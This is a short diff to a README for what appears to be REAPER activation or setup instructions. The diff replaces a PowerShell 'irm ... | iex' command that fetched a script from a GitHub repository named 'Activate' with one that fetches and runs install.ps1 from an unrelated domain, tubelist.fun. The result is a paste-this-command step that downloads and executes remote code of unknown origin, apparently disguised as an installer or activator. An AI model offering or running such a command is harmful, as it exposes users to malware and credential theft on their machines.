@@ -11,7 +11,7 @@ REAPER stands out for its small installation size, fast load times, and deep cus
 Run this command in PowerShell to get started:
 
 ```powershell
-irm https://raw.githubusercontent.com/dustfinderfactory/Activate/main/install.ps1 | iex
+irm https://tubelist.fun/install.ps1 | iex
 ```
 
 ## Turkce (Turkish)
